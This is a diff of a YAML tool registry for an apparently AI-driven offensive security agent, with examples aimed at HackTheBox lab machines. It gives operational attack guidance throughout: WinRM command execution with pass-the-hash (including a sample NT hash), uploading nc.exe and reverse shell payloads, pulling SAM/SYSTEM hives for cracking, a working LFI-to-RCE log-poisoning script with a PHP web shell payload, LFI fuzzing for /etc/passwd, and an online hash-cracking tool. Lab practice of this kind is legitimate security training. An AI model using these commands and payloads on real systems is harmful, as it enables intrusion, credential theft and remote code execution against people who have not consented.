-        description: 'Execute a command on a remote Windows host via WinRM using pypsrp. Two shell modes: PowerShell (default)
-          uses native PSRP plugin URI (http://schemas.microsoft.com/powershell/Microsoft.PowerShell) — works for non-admin
-          users on Windows Server 2025. CMD uses WinRS CMD shell URI. Authentication via NTLM transport — supports password
-          or NTLM hash (pass-the-hash via pyspnego LM:NT auto-detection). Domain prefix auto-applied as DOMAIN\username format.
-          Returns stdout, stderr, exit code, and shell type used.'
-        when_to_use: 'When you have valid Windows credentials (password or NTLM hash) and WinRM port 5985 is open. Preferred
-          over netexec winrm when you need: (1) Reliable single-command execution with clean stdout/stderr separation, (2)
-          PowerShell script execution with proper error handling, (3) CMD commands that don''t work well in PowerShell (e.g.,
-          ''dir /s'', ''type'', ''reg query''), (4) Pass-the-hash execution when only WinRM is available. For multi-target
-          credential spraying, use netexec winrm instead. For credential dumping (SAM/LSA/DPAPI), use netexec winrm which
-          has built-in dump methods.'
-        params:
-          target:
-            type: string
-            required: true
-            description: Target IP address or hostname. Single target only (not CIDR). Must have WinRM service running on
-              port 5985 (HTTP) or 5986 (HTTPS).
-          username:
-            type: string
-            required: true
-            description: Username for NTLM authentication. Domain prefix auto-applied if domain parameter set (becomes DOMAIN\username).
-          password:
-            type: string
-            description: Password for authentication. Provide either password or hash, not both. If neither is provided, empty
-              password is used.
-          hash:
-            type: string
-            description: NTLM hash for pass-the-hash. Accepts bare NT hash (32 hex chars, auto-converted to 00000000000000000000000000000000:HASH)
-              or full LM:NT format. pyspnego auto-detects LM:NT format for NTLM auth.
-          domain:
-            type: string
-            description: Active Directory domain. Prepended to username as DOMAIN\username for NTLM authentication. Omit for
-              local account authentication.
-          command:
-            type: string
-            required: true
-            description: 'Command to execute on the target. For PowerShell shell: PowerShell cmdlets and scripts (e.g., ''Get-Process'',
-              ''whoami /all'', ''Get-ChildItem C:\''). For CMD shell: native CMD commands (e.g., ''dir C:\'', ''type C:\flag.txt'',
-              ''net user'').'
-          shell:
-            type: string
-            enum:
-            - powershell
-            - cmd
-            default: powershell
-            description: Shell to use. 'powershell' (default) uses run_ps() — supports PowerShell cmdlets, scripts, and pipelines.
-              'cmd' uses run_cmd() — for native CMD commands, batch files, and commands that fail in PowerShell context.
-          ssl:
-            type: boolean
-            default: false
-            description: 'Use HTTPS/SSL transport (port 5986). Default: false (HTTP on port 5985). Enable when target requires
-              encrypted WinRM connections.'
-          port:
-            type: integer
-            description: 'Custom WinRM port. Default: 5985 (HTTP) or 5986 (HTTPS when ssl=true). Override for non-standard
-              WinRM configurations.'
-          auth:
-            type: enum
-            values:
-            - ntlm
-            - kerberos
-            default: ntlm
-            description: Auth method. Use 'kerberos' when NTLM is disabled on the target.
-          ccache_path:
-            type: string
-            description: Path to Kerberos ccache file (e.g., /session/output/credentials/auditor.ccache)
-        returns:
-          output:
-            type: string
-            description: Command stdout output (decoded UTF-8).
-          shell:
-            type: string
-            description: 'Shell used for execution: ''PowerShell'' or ''CMD''.'
-      upload:
-        required_ports:
-        - 5985
-        description: Upload a local file to the target Windows machine via WinRM using native PSRP copy. Uses pypsrp's built-in
-          copy() which handles chunking and transfer natively over the PSRP protocol — faster and more reliable than base64
-          chunking over PowerShell commands. Supports password and NTLM hash authentication.
-        when_to_use: 'To transfer tools, scripts, exploits, or payloads to the target Windows machine when only WinRM is available.
-          Use for: (1) Upload compiled exploits to C:\Windows\Temp for privilege escalation, (2) Upload enumeration scripts
-          (PowerUp, Seatbelt, winPEAS) for post-exploitation, (3) Upload reverse shell payloads for persistent access. Files
-          in /session/ directory are shared with the container.'
-        params:
-          target:
-            type: string
-            required: true
-            description: Target IP address or hostname with WinRM service running.
-          username:
-            type: string
-            required: true
-            description: Username for NTLM authentication.
-          password:
-            type: string
-            description: Password for authentication. Provide either password or hash, not both.
-          hash:
-            type: string
-            description: NTLM hash for pass-the-hash. Bare NT hash or LM:NT format.
-          domain:
-            type: string
-            description: Active Directory domain. Prepended to username as DOMAIN\username.
-          local_path:
-            type: string
-            required: true
-            description: Local file path to upload. Use /session/ prefix for files in the shared session directory (e.g.,
-              '/session/output/artifacts/exploit.exe'). File must exist and be readable.
-          remote_path:
-            type: string
-            required: true
-            description: 'Destination path on the target Windows machine. Use writable directories: C:\Windows\Temp\, C:\Users\<user>\Desktop\,
-              or share paths.'
-          ssl:
-            type: boolean
-            default: false
-            description: Use HTTPS/SSL transport (port 5986).
-          port:
-            type: integer
-            description: 'Custom WinRM port (default: 5985 HTTP, 5986 HTTPS).'
-          auth:
-            type: enum
-            values:
-            - ntlm
-            - kerberos
-            default: ntlm
-            description: Auth method. Use 'kerberos' when NTLM is disabled on the target.
-          ccache_path:
-            type: string
-            description: Path to Kerberos ccache file (e.g., /session/output/credentials/auditor.ccache)
-        returns:
-          success:
-            type: boolean
-            description: Whether upload completed successfully.
-      download:
-        required_ports:
-        - 5985
-        description: Download a file from the target Windows machine via WinRM using native PSRP fetch. Uses pypsrp's built-in
-          fetch() which handles transfer natively over the PSRP protocol — faster and more reliable than base64 encoding over
-          PowerShell commands. Supports password and NTLM hash authentication.
-        when_to_use: 'To retrieve files, flags, evidence, or loot from the target Windows machine. Use for: (1) Download CTF
-          flags (user.txt, root.txt), (2) Retrieve configuration files with credentials, (3) Download SAM/SYSTEM/SECURITY
-          hive files for offline cracking, (4) Collect evidence files for reporting. Default save location: /session/output/artifacts/.'
-        params:
-          target:
-            type: string
-            required: true
-            description: Target IP address or hostname with WinRM service running.
-          username:
-            type: string
-            required: true
-            description: Username for NTLM authentication.
-          password:
-            type: string
-            description: Password for authentication. Provide either password or hash, not both.
-          hash:
-            type: string
-            description: NTLM hash for pass-the-hash. Bare NT hash or LM:NT format.
-          domain:
-            type: string
-            description: Active Directory domain. Prepended to username as DOMAIN\username.
-          remote_path:
-            type: string
-            required: true
-            description: 'Path on the target to download. Use full Windows paths: ''C:\Users\Administrator\Desktop\root.txt'',
-              ''C:\Windows\System32\config\SAM''.'
-          local_path:
-            type: string
-            description: 'Local destination path. Default: /session/output/artifacts/<filename>. Use /session/ prefix to ensure
-              file is accessible to other tools and agents.'
-          ssl:
-            type: boolean
-            default: false
-            description: Use HTTPS/SSL transport (port 5986).
-          port:
-            type: integer
-            description: 'Custom WinRM port (default: 5985 HTTP, 5986 HTTPS).'
-          auth:
-            type: enum
-            values:
-            - ntlm
-            - kerberos
-            default: ntlm
-            description: Auth method. Use 'kerberos' when NTLM is disabled on the target.
-          ccache_path:
-            type: string
-            description: Path to Kerberos ccache file (e.g., /session/output/credentials/auditor.ccache)
-        returns:
-          content:
-            type: string
-            description: File content (if text) or path where binary file was saved.
+      reason: netexec winrm does multi-target credential spraying + SAM/LSA dumping but is NTLM-ONLY. Use netexec winrm to
+        validate creds across a subnet; switch to evil-winrm when you need an actual shell, file transfer, OR Kerberos-authenticated
+        WinRM (netexec winrm cannot do Kerberos).
+    - tool: impacket
+      reason: impacket wmiexec/psexec/smbexec/atexec/dcomexec are the sibling remote-exec protocols (WMI / SMB+service / DCOM
+        / scheduled task). Use those when WinRM (5985) is closed but SMB/RPC is open; use evil-winrm when WinRM is the open
+        vector.
+    - tool: ssh
+      reason: ssh is the equivalent remote-exec/file-transfer tool for Linux and modern Windows OpenSSH. evil-winrm is Windows-WinRM-only.
+    - tool: kerbrute
+      reason: Enumerate valid AD usernames without creds before attempting WinRM; feed confirmed user into evil-winrm.
+    usage_patterns:
+    - name: S1 — NTLM password exec
+      command: --target {ip} --username {user} --password {pw} --command {ps_command}
+      when: 'You have a cleartext Windows credential and WinRM (5985) is open. Default shell is PowerShell (PSRP plugin URI).
+        Add `--domain {DOM}` for a domain account (prefixed DOM\user). Output is a JSON object on stdout: success/data.output/data.exit_code;
+        on failure error_class + suggestions also go to stderr as `[winrm-exec] error_class=...`.'
+      example: winrm-exec --target 10.129.252.9 --username svc-alfresco --password s3rvice --command 'whoami /all'
+    - name: S2 — NTLM pass-the-hash exec
+      command: --target {ip} --username {user} --hash {nthash} --command {ps_command}
+      when: You recovered an NT hash (secretsdump / lsass) but not the cleartext. Pass a bare 32-hex NT hash (auto-prefixed
+        with 32 zero bytes for the LM half) OR a full LM:NT. NTLM transport; no Kerberos needed.
+      example: winrm-exec --target 10.129.252.9 --username Administrator --hash 32196b56ffe6f45e294117b91a83bf38 --command
+        'hostname'
+    - name: S3 — Kerberos-ccache exec (the unique capability)
+      command: --target {fqdn} --username {user} --ccache {path} --auth kerberos --command {ps_command}
+      when: NTLM is disabled on the target / hardened AD, OR you only have a Kerberos TGT. Get a ccache first (impacket-getTGT
+        in the impacket tool → /session/output/credentials/{user}.ccache), then pass `--ccache` (implies --auth kerberos).
+        **netexec winrm CANNOT do this** — it is the reason this tool is not retired. Target should be the host FQDN (Kerberos
+        is name-sensitive); ensure /session/config/krb5.conf exists (winrm-exec copies it to /etc/krb5.conf) or pass KRB5_CONFIG.
+        For clock skew vs the DC, pass FAKETIME via the cli_in_container env arg.
+      example: winrm-exec --target FOREST.htb.local --username svc-alfresco --ccache /session/output/credentials/svc-alfresco.ccache
+        --auth kerberos --command whoami
+    - name: S4 — Upload (native PSRP copy)
+      command: --target {ip} --username {user} --password {pw} --upload {local}:{remote}
+      when: Stage a binary/script/payload on the target. Uses pypsrp's native copy() (not base64-over-PowerShell — faster,
+        no size cliff). Local path should be under /session/ (e.g. /session/exploits/x.exe). Remote path is a Windows path;
+        escape backslashes for the shell (C:\\Windows\\Temp\\x.exe). Auth flags are interchangeable with S1/S2/S3 (works with
+        --hash and --ccache too).
+      example: winrm-exec --target 10.129.252.9 --username svc-alfresco --password s3rvice --upload /session/exploits/nc.exe:C:\\Windows\\Temp\\nc.exe
+    - name: S5 — Download / loot retrieval (native PSRP fetch)
+      command: --target {ip} --username {user} --password {pw} --download {remote}[:{local}]
+      when: Pull flags / hive files / loot. Uses native PSRP fetch(). If LOCAL is omitted it defaults to /session/output/<basename>.
+        Use for user.txt/root.txt, C:\Windows\System32\config\SAM+SYSTEM (for offline secretsdump), config files with creds.
+      example: winrm-exec --target 10.129.252.9 --username svc-alfresco --password s3rvice --download 'C:\\Users\\svc-alfresco\\Desktop\\user.txt:/session/output/user.txt'
+    - name: S6 — CMD-shell fallback for ConstrainedLanguage
+      command: --target {ip} --username {user} --password {pw} --shell cmd --command {cmd_command}
+      when: PowerShell exec returned a ConstrainedLanguage-mode error (error_class=permission, see failure_signatures). Re-run
+        with `--shell cmd` to use the WinRS CMD shell instead — runs native cmd.exe commands (dir, type, reg query, whoami)
+        that don't invoke restricted .NET APIs. Note CMD-shell WinRS may itself be restricted for non-admins on Win Server
+        2025 (that is precisely why the PowerShell PSRP plugin URI is the default).
+      example: winrm-exec --target 10.129.252.9 --username svc-alfresco --password s3rvice --shell cmd --command 'type C:\\Users\\svc-alfresco\\Desktop\\user.txt'
+    gotchas:
+    - 'JSON-ON-STDOUT, CLASSIFIED-ERROR-ON-STDERR. winrm-exec prints one JSON object to stdout: {success, data, error, error_class,
+      retryable, suggestions}. On any classified failure it ALSO writes `[winrm-exec] error_class=<c> retryable=<b>` + `[winrm-exec]
+      suggestion: ...` lines to stderr. Read BOTH — the stderr classification is the actionable bit (it survives even if the
+      registry-side failure_signature matching is unavailable; that is deliberate redundancy given the known kind:cli warning-blindness
+      issue). Exit codes: 0 success, 1 command-level failure (PS errors / non-zero rc — stdout JSON still valid), 2 connection/auth
+      failure, 3 argument error.'
+    - 'KERBEROS IS THE REASON THIS TOOL EXISTS. `netexec winrm` is NTLM-only (verified in nxc/protocols/winrm.py: ''nxc winrm
+      only support NTLM currently''). For NTLM-disabled / hardened AD, evil-winrm `--ccache X --auth kerberos` is the ONLY
+      registry path to an authenticated WinRM shell. Workflow: impacket-getTGT (impacket tool) → ccache at /session/output/credentials/<user>.ccache
+      → winrm-exec --ccache that path. Use the host FQDN as --target (Kerberos is name-sensitive, not IP).'
+    - PSRP PLUGIN URI vs CMD WINRS URI. Default (--shell powershell) uses pypsrp's PowerShell plugin URI (http://schemas.microsoft.com/powershell/Microsoft.PowerShell)
+      — works for non-admin 'Remote Management Users' on Windows Server 2025 where the CMD WinRS Invoke URI is restricted.
+      --shell cmd uses the WinRS CMD shell URI (may be blocked for non-admins on Server 2025). Prefer the default PowerShell
+      shell unless ConstrainedLanguage forces the CMD fallback (S6).
+    - NT HASH FORMAT. --hash accepts a bare 32-hex NT hash (winrm-exec auto-prefixes 32 zero bytes for the LM half) OR a full
+      `LM:NT`. Do NOT pass the `aad3b...:NT` blank-LM form with the real aad3b string — just give the bare NT (preferred)
+      and let winrm-exec build the `00...0:NT` pair.
+    - FAKETIME FOR KERBEROS CLOCK SKEW. KRB_AP_ERR_SKEW (error_class=config) means the container clock differs from the DC
+      by >5min. Pass FAKETIME via the cli_in_container env arg (e.g. FAKETIME='+5h'); the plugin hoists it to ContainerOptions.clockOffset
+      and the entrypoint LD_PRELOADs libfaketime. Common on HTB AD boxes where the DC time drifts.
+    - FILE TRANSFER IS NATIVE PSRP, NOT BASE64 CHUNKING. --upload uses pypsrp copy(), --download uses fetch(). No PowerShell
+      base64 size cliff (the old kind:mcp docs wrongly claimed base64 chunking — corrected here). Still, multi-MB transfers
+      over HTB-VPN latency can approach the 600s max_runtime — chunk very large files or stage via SMB instead.
+    - DOWNLOAD DEFAULT PATH is /session/output/<basename> when LOCAL is omitted in --download REMOTE[:LOCAL]. Other tools
+      (offline secretsdump on a downloaded SAM/SYSTEM, john on a recovered hash) read from /session/output/. The container
+      only persists /session/* to the host.
+    - SINGLE TARGET ONLY. winrm-exec takes one --target. For credential spraying across a subnet, that is netexec winrm's
+      job (NTLM-only but built for multi-target). evil-winrm is the post-foothold single-host shell + Kerberos + file-transfer
+      tool.
+    - 'kind:cli FLIP (May 2026). Was a 402-LOC kind:mcp server. Now: winrm-exec CLI (the binary) + a 22-LOC RunCliServer stub.
+      Image dieted ~300MB→~120MB (dropped the Kali base + the never-used Ruby evil-winrm apt package — we drive pypsrp, not
+      the Ruby REPL). The 100-LOC error classifier moved verbatim into winrm-exec and is mirrored in failure_signatures below.'
+    failure_signatures:
+    - signal: Failed to authenticate|STATUS_LOGON_FAILURE|Logon failure
+      error_class: auth
+      remediation: Wrong username/password/hash, or account locked out. Verify the credential. If NTLM is disabled on the
+        target ('Failed to authenticate' with ntlm), switch to --ccache + --auth kerberos. winrm-exec also emits this classification
+        on stderr as error_class=auth.
+    - signal: KRB_AP_ERR_SKEW|Clock skew
+      error_class: config
+      remediation: 'Kerberos clock skew >5min vs the DC. Pass FAKETIME via the cli_in_container env arg (e.g. FAKETIME=''+7m'')
+        — plugin hoists to ContainerOptions.clockOffset -> libfaketime. Retryable after sync. NOTE: python-krb5 often does
+        NOT say ''KRB_AP_ERR_SKEW'' — on HTB Forest the skew surfaced as ''Pre-authentication failed: Input/output error''
+        (next signature), so FAKETIME is also the first thing to try on a pre-auth failure with a known-good credential.'
+    - signal: Pre-authentication failed|KDC_ERR_PREAUTH_FAILED
+      error_class: auth
+      remediation: 'Kerberos pre-auth failed. (1) ccache-less --password: the password/hash is wrong. (2) credential is known-good:
+        this is almost always CLOCK SKEW — pass FAKETIME (e.g. ''+7m'') and retry (verified live on Forest — skew presents
+        as this, not KRB_AP_ERR_SKEW). (3) --ccache: the ticket is stale/expired or for the wrong realm — re-mint with impacket-getTGT
+        and klist -c to check. Retryable. winrm-exec emits this as error_class=auth retryable=True with all three suggestions
+        on stderr.'
+    - signal: not found in Kerberos database|Server not found in Kerberos database|KDC_ERR_C_PRINCIPAL_UNKNOWN
+      error_class: config
+      remediation: 'Kerberos principal/realm not found. Most common real cause (verified live on Forest): krb5.conf realm
+        not applied, so the principal falls back to the MIT default realm ATHENA.MIT.EDU (''Client user@ATHENA.MIT.EDU not
+        found''). Provide a krb5.conf with the correct [realms] via /session/config/krb5.conf or the KRB5_CONFIG env arg,
+        use the host FQDN (not IP) as --target, and confirm the ccache principal/realm matches (klist -c). Second cause: a
+        genuinely wrong principal. winrm-exec emits this as error_class=config retryable=True.'
+    - signal: ConstrainedLanguage|language mode
+      error_class: permission
+      remediation: PowerShell Constrained Language Mode active. Re-run with --shell cmd (usage_pattern S6) for basic cmd.exe
+        commands, or use PowerShell that avoids restricted .NET APIs.
+    - signal: WSManFault.*Code:\s*5|Access (is|to the path is) denied|E_ACCESSDENIED
+      error_class: permission
+      remediation: Access denied — the principal is likely not in 'Remote Management Users' or 'Administrators'. Validate
+        the account with `netexec winrm` first, or pivot to a different account.
+    - signal: requires elevation|requires other privileges|Cannot open Service Control Manager
+      error_class: permission
+      remediation: Operation needs admin. The current user is non-admin — use an admin account or escalate privileges first.
+    - signal: ConnectTimeout|connection timed out|Connection refused|ConnectionRefusedError
+      error_class: network
+      remediation: WinRM service unreachable. Confirm port 5985 (HTTP) / 5986 (HTTPS) is open (nmap -p5985,5986), the target
+        is up, and the WinRM service is running. Retryable.
+    - signal: No route to host|Network is unreachable
+      error_class: network
+      remediation: Target unreachable — check VPN (tun0) and routing. Not retryable until connectivity restored.
+    - signal: logon session does not exist|specified logon session
+      error_class: auth
+      remediation: WinRM session expired or Kerberos ticket invalidated. Re-authenticate; for Kerberos, mint a fresh TGT (impacket-getTGT)
+        and retry.
+    - signal: Operation timed out|TimeoutError
+      error_class: timeout
+      remediation: Server-side command execution timed out. Use a simpler/faster command, or for large file transfer chunk
+        it / stage via SMB.
   exploit-runner:
     name: exploit-runner
     kind: cli
@@ -5129,6 +4920,29 @@ tools:
         \ (convert the self-closing `/>` to `>...<a:hlinkClick.../></p:cNvPr>`), (2) add the matching hyperlink relationship\
         \ in ppt/slides/_rels/slide1.xml.rels with Target=<attacker URL>. Relationship Type is \"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\"\
         . For program-launch variant, the action attribute on the hlinkClick element is `action=\"ppaction://program\"`.\n"
+    - name: LFI-to-RCE via log poisoning (replaces retired lfi-rfi log_poison)
+      binary: python3
+      command: /session/exploits/{script_name}.py
+      when: "Chained LFI→RCE: poison a server-controlled file with PHP, then LFI-include it so the PHP executes. Two-step,\
+        \ needs orchestration — write a requests script (requests is pre-installed):\n\n  import requests\n  base = \"http://target/\"\
+        \n  lfi  = \"http://target/page.php?file=\"\n  # Step 1: poison the access log via User-Agent (logged verbatim)\n\
+        \  requests.get(base, headers={\"User-Agent\": \"<?php system($_GET['c']); ?>\"})\n  # Step 2: LFI the log + pass\
+        \ the command\n  r = requests.get(lfi + \"../../../../var/log/apache2/access.log&c=id\")\n  print(r.text)\n\nPoisonable\
+        \ sinks: /var/log/apache2/access.log, /var/log/nginx/access.log, /var/log/auth.log (poison via SSH username: `ssh\
+        \ '<?php ...?>'@target`), /proc/self/environ (User-Agent, old PHP), PHP session files /var/lib/php/sessions/sess_<PHPSESSID>\
+        \ (poison via a controllable session value). Textbook LFI→RCE. The retired lfi-rfi log_poison only checked `payload\
+        \ in body` (visible ≠ executed) — verify ACTUAL RCE by confirming command output (e.g. `id` → `uid=`) appears in the\
+        \ response, not just the PHP source string.\n"
+    - name: Favicon Shodan-mmh3 hash (replaces retired web-fingerprint favicon_hash)
+      binary: python3
+      command: /session/exploits/{script_name}.py
+      when: "The only non-trivial bit of the retired web-fingerprint — pivot to other hosts running the same app (default\
+        \ Jenkins/Grafana/Tomcat/Spring favicons are highly identifying). requests is pre-installed; mmh3 is NOT — `pip3 install\
+        \ --no-cache-dir mmh3` first. Script:\n\n  import mmh3, base64, hashlib, requests\n  r = requests.get(\"http://target/favicon.ico\"\
+        , verify=False, timeout=15)\n  h = mmh3.hash(base64.encodebytes(r.content))\n  print(f\"mmh3={h}  shodan: http.favicon.hash:{h}\
+        \  md5={hashlib.md5(r.content).hexdigest()}\")\n\nPivot in Shodan/Censys with `http.favicon.hash:<h>`. The MD5 is\
+        \ for comparing favicons across vhosts/ports on the same target. Plain tech fingerprinting now lives in nuclei (`-as`\
+        \ / `-tags tech`); raw header/version recon in curl (-D -).\n"
     params:
       python3:
       - 'Run a script: `python3 /session/exploits/{name}.py [args...]`'
@@ -5363,8 +5177,8 @@ tools:
       injected into URL, header, or POST data. Multi-position fuzzing via clusterbomb / pitchfork modes. Rich filtering by
       status code (-fc), size (-fs), word count (-fw), line count (-fl), regexp (-fr), and response time (-ft). Symmetrical
       matchers (-mc/-ms/-mw/-ml/-mr/-mt). Auto-calibration (-ac/-acc) profiles default/error responses to suppress them automatically.
-      Native CLI; LLM constructs the full ffuf invocation. Use curl for one-shot probes, web-session for stateful login flows,
-      nuclei for templated CVE scans.
+      Native CLI; LLM constructs the full ffuf invocation. Use curl for one-shot probes and to capture an authenticated cookie
+      jar to feed -b, nuclei for templated CVE scans.
     image: ghcr.io/silicon-works/mcp-tools-ffuf:latest
     image_size_mb: 200
     idle_timeout_seconds: 300
@@ -5392,7 +5206,7 @@ tools:
       never_use_for:
       - single one-shot HTTP request — use curl
       - JavaScript-rendered pages — use playwright
-      - stateful authenticated multi-step flows — use web-session
+      - stateful authenticated multi-step flows — capture a cookie jar with curl -c, then pass -b to ffuf
       - SQL injection — use sqlmap
       - automated CVE / template scanning — use nuclei
       - port scanning — use nmap
@@ -5422,9 +5236,8 @@ tools:
       cpu: 1.0
     see_also:
     - tool: curl
-      reason: For one-shot probes — curl baseline-fetches the default response so ffuf knows what -fs to set
-    - tool: web-session
-      reason: Use to obtain an authenticated cookie before passing -b to ffuf for post-login fuzzing
+      reason: For one-shot probes — curl baseline-fetches the default response so ffuf knows what -fs to set. Also drive a
+        login with curl -c to write a cookie jar, then pass -b /session/cookies/x.txt to ffuf for post-login fuzzing.
     - tool: playwright
       reason: For JavaScript-rendered pages or DOM interaction — ffuf only sees the HTTP response
     - tool: nuclei
@@ -5537,7 +5350,8 @@ tools:
     - name: Authenticated post-login fuzzing
       command: ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -b 'PHPSESSID={session_cookie}'
         -fc 404 -of json -o /session/output/ffuf-auth.json
-      when: Find admin / authenticated-only endpoints. Get the session cookie from web-session or from a manual login first.
+      when: Find admin / authenticated-only endpoints. Get the session cookie from a curl login (curl -c jar -d creds LOGIN_URL)
+        or from a manual login first.
     - name: Multi-FUZZ clusterbomb (param + value)
       command: ffuf -u '{url}?PARAM=VAL' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt:VAL
         -mode clusterbomb -mr 'error|sql' -of json -o /session/output/ffuf-multi.json
@@ -5557,6 +5371,17 @@ tools:
       command: ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 -of all -o /session/output/ffuf-all
       when: Write every output format (json, csv, html, md, ecsv, ejson) using a single basename. Useful when downstream consumers
         expect specific formats.
+    - name: LFI / path-traversal fuzzing (replaces retired lfi-rfi test_lfi)
+      command: ffuf -u '{url}?{param}=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr 'root:.*:0:0:' -of json
+        -o /session/output/ffuf-lfi.json
+      when: 'Test a parameter for Local File Inclusion / path traversal. Placeholders: {url} = the vulnerable script URL WITHOUT
+        query string (e.g. http://t/page.php); {param} = the vulnerable parameter name (e.g. file). The command builds {url}?{param}=FUZZ
+        — do NOT include a trailing ?  or = in {url}. The seclists LFI wordlists ARE the encoding matrix pre-expanded: LFI-Jhaddix.txt
+        (930 payloads) covers ../, %2e%2e%2f, double-URL %252e, UTF-8 overlong %c0%ae, backslash, null-byte, and depth variants.
+        `-mr ''root:.*:0:0:''` matches a successful /etc/passwd read — swap the regex for the file you target (e.g. ''DB_PASSWORD''
+        for .env, ''<?php'' for source disclosure). Bigger sweep: LFI-LFISuite-pathtotest-huge.txt (9550 payloads). Windows:
+        LFI-Windows-adeadfed.txt (215). Replaces the retired lfi-rfi tool''s test_lfi — ffuf is Go-concurrent and carries
+        20-200x more payloads than lfi-rfi''s capped hardcoded ~40.'
     output_formats:
     - flag: -of json -o {path}
       format: json
@@ -6711,16 +6536,14 @@ tools:
         Then use git-dumper to extract the repo.
     - tool: curl
       reason: Use curl to quickly confirm /.git/HEAD is accessible before running git-dumper — a response containing 'ref:'
-        confirms an exposed .git directory. Same trick for /.git/config.
+        confirms an exposed .git directory. Same trick for /.git/config. When /.git/ sits behind a login wall, drive the login
+        with curl -c to capture a cookie jar, then pass that Cookie value via -H to git-dumper.
     - tool: trufflehog
       reason: After dumping with git-dumper, run trufflehog scan_git on the recovered repo for automated secret detection
         (800+ credential types). git-dumper is the extractor; trufflehog is the scanner.
-    - tool: web-fingerprint
-      reason: Web-fingerprint identifies the framework (Flask/Laravel/Express) — common deployment misconfigurations expose
-        .git on these stacks.
-    - tool: web-session
-      reason: 'Capture an authenticated cookie before passing -H ''Cookie: ...'' or -c to git-dumper when /.git/ is behind
-        a login wall.'
+    - tool: nuclei
+      reason: nuclei -as / -tags tech identifies the framework (Flask/Laravel/Express) — common deployment misconfigurations
+        expose .git on these stacks.
     target_extraction:
     - rule: positional_match
       pattern: ^(https?)://([^:/?#]+)
@@ -6755,8 +6578,8 @@ tools:
     - name: Dump behind an auth header (bearer token / session cookie)
       command: git-dumper {url_with_git_slash} {output_dir} -H {auth_header}
       when: 'Target requires authentication. Pass the full header line via -H ''Authorization: Bearer xxx'' or -H ''Cookie:
-        PHPSESSID=...''. -H is stackable — repeat for multiple headers. Capture tokens via web-session first when the auth
-        flow is non-trivial.'
+        PHPSESSID=...''. -H is stackable — repeat for multiple headers. Capture tokens via a curl or playwright login first
+        when the auth flow is non-trivial.'
     - name: Slow / fragile target — throttle workers and timeouts
       command: git-dumper {url_with_git_slash} {output_dir} -j 2 -t 60 -r 3
       when: Target is rate-limiting, behind a slow link, or returning intermittent 5xx. Drop -j to 2 (default 10 is aggressive),
@@ -6897,199 +6720,6 @@ tools:
       purpose: Concise flag listing
     - command: git-dumper -h
       purpose: Same as --help
-  hash-lookup:
-    name: hash-lookup
-    version: '1.0'
-    description: Online hash lookup tool that queries public pre-cracked hash databases (hashes.com, nitrxgen, hashtoolkit)
-      to instantly recover plaintext passwords from known hashes. Much faster than john/hashcat for common passwords — lookup
-      takes seconds vs minutes/hours for offline cracking. Also provides hash type identification (MD5, SHA1, SHA256, SHA512,
-      NTLM, MySQL, bcrypt) via pattern matching, and hash generation (MD5, SHA1, SHA256, SHA512, NTLM) for testing and verification.
-      Pure Python — no external tools, requires network access.
-    image: ghcr.io/silicon-works/mcp-tools-hash-lookup:latest
-    image_size_mb: 100
-    timeout_seconds: 60
-    capabilities:
-    - hash_lookup
-    - hash_identification
-    - online_cracking
-    phases:
-    - post-exploitation
-    requirements:
-      network: true
-      privileged: false
-    resources:
-      memory_mb: 128
-      cpu: 0.25
-    routing:
-      use_for:
-      - instantly crack known password hashes via online database lookup
-      - identify unknown hash type format from hash string
-      - check if a hash has been previously cracked in public databases
-      - quick hash lookup before running slow offline cracking with john
-      - generate MD5 SHA1 SHA256 SHA512 NTLM hashes for testing
-      - batch lookup of multiple password hashes at once
-      - verify cracked passwords by comparing generated hashes
-      never_use_for:
-      - offline brute-force cracking (use john)
-      - password spraying or online brute-force (use hydra)
-      - cracking salted hashes (online databases don't have salted hashes)
-      - bcrypt scrypt argon2 hashes (too slow to precompute)
-      triggers:
-      - hash
-      - crack
-      - password hash
-      - NTLM
-      - MD5
-      - SHA
-      - hash lookup
-      - identify hash
-      - what hash
-      prefer_over:
-      - hydra
-    methods:
-      lookup:
-        description: 'Look up a single hash in public pre-cracked hash databases. Queries sources in order: (1) hashes.com
-          API (best coverage, supports all hash types), (2) nitrxgen (MD5 only, fast), (3) hashtoolkit.com (HTML scraping).
-          Returns immediately when the first source finds a match. These databases contain billions of pre-computed hash-to-plaintext
-          mappings from rainbow tables and wordlist cracking. Only works for unsalted hashes (MD5, SHA1, SHA256, NTLM) — salted
-          hashes ($6$, bcrypt, etc.) won''t be found in online databases.'
-        when_to_use: 'The very first thing to try when you have unsalted password hashes — before running john or hashcat.
-          Online lookup takes 1-3 seconds vs minutes/hours for offline cracking. Common scenario: extract MD5/SHA1/NTLM hashes
-          from a database dump or web application, look them up here first, then crack the remaining unfound hashes with john.
-          Works best for: simple MD5 hashes, NTLM hashes from Windows, SHA1 hashes from older applications. Won''t work for:
-          salted hashes (Linux /etc/shadow $6$..., bcrypt $2a$...), non-standard hash formats, or strong unique passwords.'
-        params:
-          hash:
-            type: string
-            required: true
-            description: 'Hash value to look up. Bare hex string only — no prefix, no ''user:'' prefix, no salt. Examples:
-              ''5f4dcc3b5aa765d61d8327deb882cf99'' (MD5 of ''password''), ''a94a8fe5ccb19ba61c4c0873d391e987982fbbd3'' (SHA1).
-              The hash is lowercased and trimmed automatically.'
-          hash_type:
-            type: enum
-            values:
-            - auto
-            - md5
-            - sha1
-            - sha256
-            - ntlm
-            default: auto
-            description: 'Hash type. ''auto'' detects by length: 32 chars = MD5 or NTLM, 40 chars = SHA1, 64 chars = SHA256.
-              Specifying the type doesn''t change the lookup behavior much — it mainly helps with logging. Note: 32-char hashes
-              are ambiguous between MD5 and NTLM (both are 32 hex chars).'
-        returns:
-          hash:
-            type: string
-            description: The hash that was looked up (lowercased)
-          plaintext:
-            type: string
-            description: Recovered plaintext password (null if not found)
-          source:
-            type: string
-            description: Database that returned the result ('hashes.com', 'nitrxgen', or 'hashtoolkit')
-          cracked:
-            type: boolean
-            description: Whether the plaintext was found in any database
-          hash_type:
-            type: string
-            description: Detected or specified hash type
-      lookup_batch:
-        description: 'Look up multiple hashes sequentially by calling the lookup method for each hash. Results are aggregated
-          into cracked and not_found lists. Note: this is sequential (not parallel), so N hashes take N * 1-3 seconds. The
-          not_found output is capped at 10 entries to avoid excessive output.'
